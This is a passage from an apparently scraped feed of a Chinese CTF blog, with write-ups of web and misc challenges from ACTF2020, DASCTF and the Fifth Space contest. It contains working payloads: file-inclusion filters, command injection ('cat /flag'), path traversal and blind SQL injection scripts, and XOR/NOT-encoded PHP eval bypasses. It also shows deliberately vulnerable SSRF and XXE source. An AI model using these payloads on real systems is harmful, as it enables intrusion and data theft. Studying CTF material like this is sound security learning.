      &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; class=&quot;aplayer-secondary-script-marker&quot;&gt;&lt;/script&gt;&lt;h2 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h2&gt;&lt;h3 id=&quot;ACTF2020-新生赛-Include&quot;&gt;&lt;a href=&quot;#ACTF2020-新生赛-Include&quot; class=&quot;headerlink&quot; title=&quot;[ACTF2020 新生赛]Include&quot;&gt;&lt;/a&gt;[ACTF2020 新生赛]Include&lt;/h3&gt;&lt;p&gt;伪协议加文件包含&lt;/p&gt;&lt;p&gt;&lt;code&gt;?file=php://filter/read/convert.base64-encode/resource=flag.php&lt;/code&gt;&lt;/p&gt;&lt;h3 id=&quot;ACTF2020-新生赛-Exec&quot;&gt;&lt;a href=&quot;#ACTF2020-新生赛-Exec&quot; class=&quot;headerlink&quot; title=&quot;[ACTF2020 新生赛]Exec&quot;&gt;&lt;/a&gt;[ACTF2020 新生赛]Exec&lt;/h3&gt;&lt;p&gt;命令执行&lt;/p&gt;&lt;p&gt;&lt;code&gt;127.0.0.1;cat /flag&lt;/code&gt;&lt;/p&gt;&lt;h3 id=&quot;ACTF2020-新生赛-BackupFile&quot;&gt;&lt;a href=&quot;#ACTF2020-新生赛-BackupFile&quot; class=&quot;headerlink&quot; title=&quot;[ACTF2020 新生赛]BackupFile&quot;&gt;&lt;/a&gt;[ACTF2020 新生赛]BackupFile&lt;/h3&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="刷题" scheme="https://0xcreed.jxustctf.top/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF_7月赛</title>
    <link href="https://0xcreed.jxustctf.top/2020/07/DASCTF-7%E6%9C%88%E8%B5%9B/"/>
    <id>https://0xcreed.jxustctf.top/2020/07/DASCTF-7%E6%9C%88%E8%B5%9B/</id>
    <published>2020-07-26T08:29:16.000Z</published>
    <updated>2020-07-26T10:35:16.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-Ezinclude"><a href="#1-Ezinclude" class="headerlink" title="1.Ezinclude"></a>1.Ezinclude</h3><p>  URL的请求加了个unix时间戳，只能写脚本淦。后面测试发现gqy.jpg和/gqy.jpg回显相同，可以判断文件名前拼接了路径，这种情况无法使用wrapper等手段的。同时waf也会过滤 <code>../</code>。尝试多次都没包含成功，就强行用了下伪协议成功了，后面看了源码醉了，如果f参数的开头给出一个目录再穿越就可以绕过waf了。这里的伪协议就相当于目录。</p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">file=<span class="string">b'php://filter/read=convert.base64-encode/resource=../../../../../../../../../../flag'</span></span><br><span class="line">t=int(time.time())</span><br><span class="line">f= base64.b64encode(file).decode()</span><br><span class="line">url = <span class="string">'http://183.129.189.60:10009/image.php?t=&#123;&#125;&amp;f=&#123;&#125;'</span>.format(t,f)</span><br><span class="line"><span class="comment">#print(url)</span></span><br><span class="line">res = requests.get(url=url)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'t'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'f'</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"you miss some parameters"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $timestamp = time();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(abs($_GET[<span class="string">'t'</span>] - $timestamp) &gt; <span class="number">10</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"what's your time?"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $file = base64_decode($_GET[<span class="string">'f'</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(substr($file, <span class="number">0</span>, strlen(<span class="string">"/../"</span>)) === <span class="string">"/../"</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">"../"</span>)) === <span class="string">"../"</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">"./"</span>)) === <span class="string">"./"</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">"/."</span>)) === <span class="string">"/."</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">"//"</span>)) === <span class="string">"//"</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'You are not allowed to do that.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">'/var/www/html/img/'</span>.$file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-SQLI"><a href="#2-SQLI" class="headerlink" title="2.SQLI"></a>2.SQLI</h3><p>就大概看了下题目，后面比赛结束环境没了，就看了下<a href="https://www.gem-love.com/ctf/2514.html" target="_blank" rel="noopener">y1ng</a>师傅的题解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#__author__: 颖奇L'Amore www.gem-love.com</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> time <span class="keyword">as</span> t</span><br><span class="line"><span class="keyword">import</span> base64 <span class="keyword">as</span> b</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">alpa = string.ascii_letters + string.digits</span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="comment">#库名 利用limit注入 sqlidb</span></span><br><span class="line"><span class="comment"># http://183.129.189.60:10004/?id=1%27limit/**/1,1/**/PROCEDURE/**/ANALYSE(1)%23</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#表名 flllaaaggg</span></span><br><span class="line">payload = <span class="string">'''SELECT group_concat(table_name) FROM  sys.x$schema_flattened_keys WHERE table_schema='sqlidb' GROUP BY table_name limit 0,1'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">true<span class="keyword">for</span> char <span class="keyword">in</span> alpa:</span><br><span class="line">truetruehost = <span class="string">'''http://183.129.189.60:10004/?id=1'=(substr((&#123;payload&#125;),&#123;i&#125;,1)='&#123;char&#125;')%23'''</span>.format(payload=payload.replace(<span class="string">' '</span>,<span class="string">'/**/'</span>), i=i, char=char)</span><br><span class="line"></span><br><span class="line">truetruer = req.get(host)</span><br><span class="line">truetrue<span class="keyword">if</span> <span class="string">r'admin666'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">truetruetrueres += char</span><br><span class="line">truetruetrueprint(<span class="string">"found it: "</span>+res)</span><br><span class="line">truetruetrue<span class="keyword">break</span></span><br><span class="line">truetruet.sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure><p>因为可以联合注入，所以直接联合查表也行</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">183.129</span><span class="number">.189</span><span class="number">.60</span>:<span class="number">10004</span>/?id=<span class="number">100</span>%<span class="number">27</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span>group_concat(<span class="built_in">table_name</span>),<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">FROM</span><span class="comment">/**/</span><span class="comment">/**/</span>sys.x$schema_flattened_keys<span class="comment">/**/</span><span class="keyword">WHERE</span><span class="comment">/**/</span>table_schema=<span class="string">'sqlidb'</span><span class="comment">/**/</span><span class="keyword">GROUP</span><span class="comment">/**/</span><span class="keyword">BY</span><span class="comment">/**/</span><span class="built_in">table_name</span><span class="comment">/**/</span><span class="keyword">limit</span><span class="comment">/**/</span><span class="number">0</span>,<span class="number">1</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure><p>获取flag</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">183.129</span><span class="number">.189</span><span class="number">.60</span>:<span class="number">10004</span>/?id=<span class="number">100</span>’<span class="comment">/**/</span><span class="built_in">union</span><span class="comment">/**/</span>select<span class="comment">/**/</span>*,<span class="number">1</span><span class="comment">/**/</span><span class="built_in">from</span><span class="comment">/**/</span>flllaaaggg%<span class="number">23</span></span><br></pre></td></tr></table></figure><p>记录一下bypass information_schema的库</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">host_summary</span> -&gt;</span> host、total_connections历史连接IP、对应IP的连接次数</span><br><span class="line"> <span class="function"><span class="title">innodb_buffer_stats_by_schema</span> -&gt;</span> object_schema库名</span><br><span class="line"> <span class="function"><span class="title">innodb_buffer_stats_by_table</span> -&gt;</span> object_schema、object_name库名、表名(可指定)</span><br><span class="line"> <span class="function"><span class="title">io_global_by_file_by_bytes</span> -&gt;</span> file路径中包含库名</span><br><span class="line"> <span class="function"><span class="title">io_global_by_file_by_latency</span> -&gt;</span> file路径中包含库名</span><br><span class="line"> <span class="function"><span class="title">processlist</span> -&gt;</span> current_statement、last_statement当前数据库正在执行的语句、该句柄执行的上一条语句</span><br><span class="line"> <span class="function"><span class="title">schema_auto_increment_columns</span> -&gt;</span> table_schema、table_name、column_name库名、表名、列名</span><br><span class="line"> <span class="function"><span class="title">schema_index_statistics</span> -&gt;</span> table_schema、table_name库名、表名</span><br><span class="line"> <span class="function"><span class="title">schema_object_overview</span> -&gt;</span> db库名</span><br><span class="line"> <span class="function"><span class="title">schema_table_statistics</span> -&gt;</span> table_schema、table_name库名、表名</span><br><span class="line"> <span class="function"><span class="title">schema_table_statistics_with_buffer</span> -&gt;</span> table_schema、table_name库名、表名</span><br><span class="line"> <span class="function"><span class="title">schema_tables_with_full_table_scans</span> -&gt;</span> object_schema、object_name库名、表名(全面扫描访问)</span><br><span class="line"> <span class="function"><span class="title">session</span> -&gt;</span> current_statement、last_statement当前数据库正在执行的语句、该句柄执行的上一条语句</span><br><span class="line"> <span class="function"><span class="title">statement_analysis</span> -&gt;</span> query、db数据库最近执行的请求、对于请求访问的数据库名</span><br><span class="line"> <span class="function"><span class="title">statementswith</span>* -&gt;</span> query、db数据库最近执行的特殊情况的请求、对应请求的数据库</span><br><span class="line"> <span class="function"><span class="title">version</span> -&gt;</span> mysql_versionmysql版本信息</span><br><span class="line"> x$innodb_buffer_stats_by_schema同innodb_buffer_stats_by_schema</span><br><span class="line"> x$innodb_buffer_stats_by_table同innodb_buffer_stats_by_table</span><br><span class="line"> x$io_global_by_file_by_bytes同io_global_by_file_by_bytes</span><br><span class="line"> <span class="function"><span class="title">x</span>$schema_flattened_keys -&gt;</span> table_schema、table_name、index_columns库名、表名、主键名</span><br><span class="line"> <span class="function"><span class="title">x</span>$ps_schema_table_statistics_io -&gt;</span> table_schema、table_name、count_read库名、表名、读取该表的次数</span><br></pre></td></tr></table></figure><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="1-welcome-to-the-misc-world"><a href="#1-welcome-to-the-misc-world" class="headerlink" title="1.welcome to the misc world"></a>1.welcome to the misc world</h3><p>和北邮校赛的一道题挺类似的，LSB隐写。可以用<a href="https://0xcreed.jxustctf.top/2020/03/2020%E5%8C%97%E9%82%AE%E6%A0%A1%E8%B5%9B/#3-Hello-misc">脚本</a>也可以用<code>zsteg</code>,分离得到一张包含密码的图片。</p><p><img src="/2020/07/DASCTF-7月赛/image-20200726181457308.png" alt="image-20200726181457308"></p><p>得到密码: <code>/*///1258/*/@#</code></p><p>解压后得到hint.png和7.png。hint.png最后有一串base64字符串，解码后是Unicode</p><p>![批注 2020-07-25 104650](DASCTF-7月赛/批注 2020-07-25 104650.jpg)</p><p>社会主义核心价值观解码</p><p>![批注 2020-07-25 105244](DASCTF-7月赛/批注 2020-07-25 105244.jpg)</p><p>找了很久没有找到疑似base85的字符串</p><p>最后7z打开压缩包 。。。NTFS隐写</p><p>![批注 2020-07-25 113101](DASCTF-7月赛/批注 2020-07-25 113101.jpg)</p>]]></content>
    
    <summary type="html">
    
      好久没打比赛了
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="WEB" scheme="https://0xcreed.jxustctf.top/tags/WEB/"/>
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>第四届第五空间安全大赛</title>
    <link href="https://0xcreed.jxustctf.top/2020/06/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <id>https://0xcreed.jxustctf.top/2020/06/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</id>
    <published>2020-06-24T02:23:56.000Z</published>
    <updated>2020-08-22T01:55:36.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-hate-php"><a href="#1-hate-php" class="headerlink" title="1.hate-php"></a>1.<strong>hate-php</strong></h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/(f|l|a|g|\.|p|h|\/|;|\"|\'|\`|\||\[|\]|\_|=)/i'</span>,$code)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'You are too good for me'</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = get_defined_functions()[<span class="string">'internal'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123; </span><br><span class="line">        <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blackitem . <span class="string">'/im'</span>, $code)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'You deserve better'</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    assert($code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><p>禁用了 <code>=</code> 所以伪协议 拼接字符串 等方法用不了</p><p>但 取反和异或没被禁用</p><p>取反payload:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=(~<span class="symbol">%8</span>C<span class="symbol">%86</span><span class="symbol">%8</span>C<span class="symbol">%8</span>B<span class="symbol">%9</span>A<span class="symbol">%92</span>)(~<span class="symbol">%9</span>C<span class="symbol">%9</span>E<span class="symbol">%8</span>B<span class="symbol">%DF</span><span class="symbol">%99</span><span class="symbol">%93</span><span class="symbol">%9</span>E<span class="symbol">%98</span><span class="symbol">%D1</span><span class="symbol">%8</span>F<span class="symbol">%97</span><span class="symbol">%8</span>F)</span><br></pre></td></tr></table></figure><p> 异或payload</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=(<span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span>^<span class="symbol">%D3</span><span class="symbol">%D9</span><span class="symbol">%D3</span><span class="symbol">%D4</span><span class="symbol">%C5</span><span class="symbol">%CD</span>)(<span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span>^<span class="symbol">%C3</span><span class="symbol">%C1</span><span class="symbol">%D4</span><span class="symbol">%80</span><span class="symbol">%C6</span><span class="symbol">%CC</span><span class="symbol">%C1</span><span class="symbol">%C7</span><span class="symbol">%8</span>E<span class="symbol">%D0</span><span class="symbol">%C8</span><span class="symbol">%D0</span>)</span><br></pre></td></tr></table></figure><p><a href="http://0xcreed.jxustctf.top/2019/10/%E7%AC%AC%E5%8D%81%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98Write-up/#RCE-me-I-don%E2%80%99t-think-U-can-system-RCE-prove-to-me">异或构造脚本</a></p><h3 id="2-do-you-know"><a href="#2-do-you-know" class="headerlink" title="2.do you know"></a>2.do you know</h3><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#本题无法访问外网</span></span><br><span class="line"><span class="comment">#这题真没有其他文件，请不要再开目录扫描器了，有的文件我都在注释里面告诉你们了</span></span><br><span class="line"><span class="comment">#各位大佬...这题都没有数据库的存在...麻烦不要用工具扫我了好不好</span></span><br><span class="line"><span class="comment">#there is xxe.php</span></span><br><span class="line">$poc=$_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/log|flag|hist|dict|etc|file|write/i"</span> ,$poc))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"no hacker"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">$ids=explode(<span class="string">'&amp;'</span>,$poc);</span><br><span class="line">$a_key=explode(<span class="string">'='</span>,$ids[<span class="number">0</span>])[<span class="number">0</span>];</span><br><span class="line">$b_key=explode(<span class="string">'='</span>,$ids[<span class="number">1</span>])[<span class="number">0</span>];</span><br><span class="line">$a_value=explode(<span class="string">'='</span>,$ids[<span class="number">0</span>])[<span class="number">1</span>];</span><br><span class="line">$b_value=explode(<span class="string">'='</span>,$ids[<span class="number">1</span>])[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$a_key||!$b_key||!$a_value||!$b_value)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'我什么都没有~'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($a_key==$b_key)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"trick"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($a_value!==$b_value)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span>(count($_GET)!=<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'be it so'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key=&gt;$value)</span><br><span class="line">&#123;</span><br><span class="line">        $url=$value;</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">    <span class="keyword">if</span> ($type != <span class="string">'file'</span>) &#123;</span><br><span class="line">        <span class="comment">#add_debug_log($param, 'post_data');</span></span><br><span class="line">        <span class="comment">// 设置超时</span></span><br><span class="line">        curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">30</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 设置超时</span></span><br><span class="line">        curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">180</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_POST, <span class="keyword">true</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">false</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置header</span></span><br><span class="line">    <span class="keyword">if</span> ($type == <span class="string">'file'</span>) &#123;</span><br><span class="line">        $header[] = <span class="string">"content-type: multipart/form-data; charset=UTF-8"</span>;</span><br><span class="line">        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> ($type == <span class="string">'xml'</span>) &#123;</span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="keyword">false</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> ($has_json) &#123;</span><br><span class="line">        $header[] = <span class="string">"content-type: application/json; charset=UTF-8"</span>;</span><br><span class="line">        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)');</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_AUTOREFERER, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// dump($param);</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_POSTFIELDS, $param);</span><br><span class="line">    <span class="comment">// 要求结果为字符串且输出到屏幕上</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">// 使用证书：cert 与 key 分别属于两个.pem文件</span></span><br><span class="line">    $res = curl_exec($ch);</span><br><span class="line">    var_dump($res);</span><br></pre></td></tr></table></figure><p>xxe.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#这题在上午的时候为了防止有人用webshell扫描器d，有一段时间临时过滤了system关键字，但是这个关键字在解题中是用不到的，所以才过滤它，给选手造成的不便请您谅解</span></span><br><span class="line"><span class="comment">#这题和命令执行无关，请勿尝试</span></span><br><span class="line"><span class="comment">#there is main.php and hints.php</span></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>] !== <span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'show me your identify'</span>);</span><br><span class="line">&#125;</span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$data = <span class="keyword">isset</span>($_POST[<span class="string">'data'</span>])?trim($_POST[<span class="string">'data'</span>]):<span class="string">''</span>;</span><br><span class="line">$data = preg_replace(<span class="string">"/file|flag|write|xxe|test|rot13|utf|print|quoted|read|string|ASCII|ISO|CP1256|cs_CZ|en_AU|dtd|mcrypt|zlib/i"</span>,<span class="string">''</span>,$data);</span><br><span class="line">$resp = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>($data != <span class="keyword">false</span>)&#123;</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($data, LIBXML_NOENT);</span><br><span class="line">    ob_start();</span><br><span class="line">    var_dump($dom);</span><br><span class="line">    $resp = 